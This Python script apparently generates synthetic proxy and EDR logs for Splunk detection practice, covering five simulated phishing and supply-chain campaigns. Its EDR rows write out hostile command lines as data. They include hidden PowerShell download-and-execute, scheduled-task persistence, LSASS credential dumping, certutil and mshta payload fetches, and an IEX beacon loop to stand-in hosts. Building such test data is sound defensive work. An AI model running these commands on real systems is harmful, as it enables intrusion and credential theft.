"""
Generate rich sample data for Splunk ingestion.
Creates proxy_logs_full.csv and edr_logs_full.csv with 5 distinct attack campaigns.

Campaigns:
  C1 — Invoice phishing (credential harvest + payload execution)
  C2 — HR benefits phishing (credential theft + recon + lateral movement)
  C3 — Fake Dropbox file share (blocked by proxy)
  C4 — Internal helpdesk notification (benign / false positive)
  C5 — Vendor supply chain attack (macro + DLL sideload + C2 beacon)
"""

import csv
import os

SAMPLE_DIR = os.path.join(os.path.dirname(__file__), "..", "sample logs")

# ─────────────────────────────────────────────────────────────
# PROXY LOGS — Who visited which URL and was it allowed?
# ─────────────────────────────────────────────────────────────

proxy_data = [
    # Campaign 1: Invoice phishing — 2 users clicked, both allowed
    ("2026-04-10T10:45:00", "192.168.1.50", "jsmith@yourcompany.com",
     "http://update-microsoft-support.com/login", "ALLOWED"),
    ("2026-04-10T11:10:00", "192.168.1.51", "tstark@yourcompany.com",
     "http://update-microsoft-support.com/login", "ALLOWED"),

    # Campaign 2: HR benefits phishing — 3 users clicked, all allowed
    ("2026-04-11T09:15:00", "192.168.1.52", "amorales@yourcompany.com",
     "http://hr-benefits-portal.com/verify", "ALLOWED"),
    ("2026-04-11T09:22:00", "192.168.1.53", "bwilson@yourcompany.com",
     "http://hr-benefits-portal.com/verify", "ALLOWED"),
    ("2026-04-11T09:45:00", "192.168.1.54", "cjones@yourcompany.com",
     "http://hr-benefits-portal.com/verify", "ALLOWED"),

    # Campaign 3: Fake Dropbox share — 2 users tried, BOTH blocked by proxy
    ("2026-04-11T14:30:00", "192.168.1.55", "dpark@yourcompany.com",
     "http://secure-dropbox-share.com/doc/shared-file", "BLOCKED"),
    ("2026-04-11T14:35:00", "192.168.1.58", "rnguyen@yourcompany.com",
     "http://secure-dropbox-share.com/doc/shared-file", "BLOCKED"),

    # Campaign 4: Internal helpdesk (BENIGN) — legitimate internal URL
    ("2026-04-12T08:10:00", "192.168.1.56", "efoster@yourcompany.com",
     "https://helpdesk.yourcompany.com/ticket/2847", "ALLOWED"),

    # Campaign 5: Vendor supply chain — 3 users clicked, all allowed
    ("2026-04-12T13:00:00", "192.168.1.50", "jsmith@yourcompany.com",
     "http://vendor-portal-update.com/patch", "ALLOWED"),
    ("2026-04-12T13:20:00", "192.168.1.57", "gthomas@yourcompany.com",
     "http://vendor-portal-update.com/patch", "ALLOWED"),
    ("2026-04-12T13:35:00", "192.168.1.59", "hlee@yourcompany.com",
     "http://vendor-portal-update.com/patch", "ALLOWED"),
]

# ─────────────────────────────────────────────────────────────
# EDR / ENDPOINT LOGS — What processes ran on each machine?
# ─────────────────────────────────────────────────────────────

edr_data = [
    # ═══════════════════════════════════════════════════════════
    # CAMPAIGN 1 — jsmith: FULL COMPROMISE CHAIN
    # ═══════════════════════════════════════════════════════════
    ("2026-04-10T10:46:00", "192.168.1.50", "jsmith", "chrome.exe",
     "chrome.exe --single-argument http://update-microsoft-support.com/login",
     "Allowed"),
    ("2026-04-10T10:47:15", "192.168.1.50", "jsmith", "cmd.exe",
     'cmd.exe /c powershell.exe -w hidden -ep bypass -c "Invoke-WebRequest '
     '-Uri http://update-microsoft-support.com/payload.exe '
     '-OutFile C:\\Temp\\payload.exe; Start-Process C:\\Temp\\payload.exe"',
     "Allowed"),
    ("2026-04-10T10:47:20", "192.168.1.50", "jsmith", "payload.exe",
     "C:\\Temp\\payload.exe", "Allowed"),
    # Persistence via scheduled task
    ("2026-04-10T10:48:00", "192.168.1.50", "jsmith", "schtasks.exe",
     'schtasks /create /sc onlogon /tn "WindowsUpdate" /tr C:\\Temp\\payload.exe /rl highest',
     "Allowed"),
    # C2 beacon callback
    ("2026-04-10T10:49:00", "192.168.1.50", "jsmith", "payload.exe",
     "C:\\Temp\\payload.exe -beacon -interval 300 -c2 185.220.101.45:443",
     "Allowed"),

    # CAMPAIGN 1 — tstark: Clicked, browser only (no compromise)
    ("2026-04-10T11:10:05", "192.168.1.51", "tstark", "chrome.exe",
     "chrome.exe --single-argument http://update-microsoft-support.com/login",
     "Allowed"),

    # ═══════════════════════════════════════════════════════════
    # CAMPAIGN 2 — amorales: Credential theft + clipboard steal
    # ═══════════════════════════════════════════════════════════
    ("2026-04-11T09:15:30", "192.168.1.52", "amorales", "chrome.exe",
     "chrome.exe --single-argument http://hr-benefits-portal.com/verify",
     "Allowed"),
    ("2026-04-11T09:16:45", "192.168.1.52", "amorales", "chrome.exe",
     "chrome.exe --form-submit http://hr-benefits-portal.com/verify?action=login",
     "Allowed"),
    ("2026-04-11T09:17:00", "192.168.1.52", "amorales", "powershell.exe",
     'powershell.exe -w hidden -c "Get-Clipboard | Out-File '
     'C:\\Users\\amorales\\AppData\\Local\\Temp\\cb.txt"',
     "Allowed"),

    # CAMPAIGN 2 — bwilson: Clicked, browser only
    ("2026-04-11T09:22:10", "192.168.1.53", "bwilson", "chrome.exe",
     "chrome.exe --single-argument http://hr-benefits-portal.com/verify",
     "Allowed"),

    # CAMPAIGN 2 — cjones: Credential + Active Directory recon + lateral movement
    ("2026-04-11T09:45:15", "192.168.1.54", "cjones", "chrome.exe",
     "chrome.exe --single-argument http://hr-benefits-portal.com/verify",
     "Allowed"),
    ("2026-04-11T09:46:00", "192.168.1.54", "cjones", "chrome.exe",
     "chrome.exe --form-submit http://hr-benefits-portal.com/verify?action=login",
     "Allowed"),
    # AD enumeration
    ("2026-04-11T09:47:30", "192.168.1.54", "cjones", "net.exe",
     "net.exe user /domain", "Allowed"),
    ("2026-04-11T09:48:00", "192.168.1.54", "cjones", "net.exe",
     'net.exe group "Domain Admins" /domain', "Allowed"),
    # Lateral movement attempt (BLOCKED by EDR)
    ("2026-04-11T09:49:00", "192.168.1.54", "cjones", "PsExec.exe",
     "PsExec.exe \\\\192.168.1.60 cmd.exe /c whoami", "Blocked"),
    # Credential dumping attempt
    ("2026-04-11T09:50:00", "192.168.1.54", "cjones", "rundll32.exe",
     "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 C:\\Temp\\lsass.dmp full",
     "Blocked"),

    # ═══════════════════════════════════════════════════════════
    # CAMPAIGN 3 — dpark & rnguyen: Proxy blocked, NO endpoint activity
    # (intentionally empty — no EDR rows for these IPs)
    # ═══════════════════════════════════════════════════════════

    # ═══════════════════════════════════════════════════════════
    # CAMPAIGN 4 — efoster: BENIGN / legitimate helpdesk activity
    # ═══════════════════════════════════════════════════════════
    ("2026-04-12T08:10:15", "192.168.1.56", "efoster", "chrome.exe",
     "chrome.exe --single-argument https://helpdesk.yourcompany.com/ticket/2847",
     "Allowed"),
    ("2026-04-12T08:11:00", "192.168.1.56", "efoster", "outlook.exe",
     "outlook.exe", "Allowed"),
    ("2026-04-12T08:15:00", "192.168.1.56", "efoster", "Teams.exe",
     "Teams.exe --system-initiated", "Allowed"),

    # ═══════════════════════════════════════════════════════════
    # CAMPAIGN 5 — jsmith: Macro → mshta → certutil → DLL sideload
    # ═══════════════════════════════════════════════════════════
    ("2026-04-12T13:01:00", "192.168.1.50", "jsmith", "chrome.exe",
     "chrome.exe --single-argument http://vendor-portal-update.com/patch",
     "Allowed"),
    ("2026-04-12T13:01:30", "192.168.1.50", "jsmith", "EXCEL.EXE",
     "EXCEL.EXE C:\\Users\\jsmith\\Downloads\\security_patch_v2.xlsm",
     "Allowed"),
    ("2026-04-12T13:02:00", "192.168.1.50", "jsmith", "mshta.exe",
     'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run '
     '""certutil -urlcache -split -f http://vendor-portal-update.com/update.dll '
     'C:\\Temp\\update.dll"", 0:close")',
     "Allowed"),
    ("2026-04-12T13:02:30", "192.168.1.50", "jsmith", "certutil.exe",
     "certutil.exe -urlcache -split -f http://vendor-portal-update.com/update.dll "
     "C:\\Temp\\update.dll",
     "Allowed"),
    ("2026-04-12T13:03:00", "192.168.1.50", "jsmith", "rundll32.exe",
     "rundll32.exe C:\\Temp\\update.dll,DllMain", "Allowed"),

    # CAMPAIGN 5 — gthomas: Clicked, browser only
    ("2026-04-12T13:20:10", "192.168.1.57", "gthomas", "chrome.exe",
     "chrome.exe --single-argument http://vendor-portal-update.com/patch",
     "Allowed"),

    # CAMPAIGN 5 — hlee: Macro → encoded PowerShell → C2 beacon
    ("2026-04-12T13:35:15", "192.168.1.59", "hlee", "chrome.exe",
     "chrome.exe --single-argument http://vendor-portal-update.com/patch",
     "Allowed"),
    ("2026-04-12T13:35:45", "192.168.1.59", "hlee", "EXCEL.EXE",
     "EXCEL.EXE C:\\Users\\hlee\\Downloads\\security_patch_v2.xlsm",
     "Allowed"),
    ("2026-04-12T13:36:15", "192.168.1.59", "hlee", "powershell.exe",
     "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi"
     "AEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA",
     "Allowed"),
    # Persistent beacon loop
    ("2026-04-12T13:37:00", "192.168.1.59", "hlee", "powershell.exe",
     'powershell.exe -w hidden -c "while($true){IEX(IWR '
     'http://vendor-portal-update.com/beacon -UseBasicParsing);Start-Sleep -s 300}"',
     "Allowed"),
]


def generate():
    os.makedirs(SAMPLE_DIR, exist_ok=True)

    # Write proxy logs
    proxy_path = os.path.join(SAMPLE_DIR, "proxy_logs_full.csv")
    with open(proxy_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["_time", "src_ip", "user", "url", "action"])
        writer.writerows(proxy_data)
    print(f"✅ Created {proxy_path} ({len(proxy_data)} events)")

    # Write EDR logs
    edr_path = os.path.join(SAMPLE_DIR, "edr_logs_full.csv")
    with open(edr_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["_time", "host_ip", "user", "process_name", "command_line", "action"])
        writer.writerows(edr_data)
    print(f"✅ Created {edr_path} ({len(edr_data)} events)")

    print(f"\n📊 Summary:")
    print(f"   Proxy events: {len(proxy_data)} across 5 campaigns")
    print(f"   EDR events:   {len(edr_data)} across 5 campaigns")
    print(f"\n📁 Files ready for Splunk ingestion in: {SAMPLE_DIR}")


if __name__ == "__main__":
    generate()
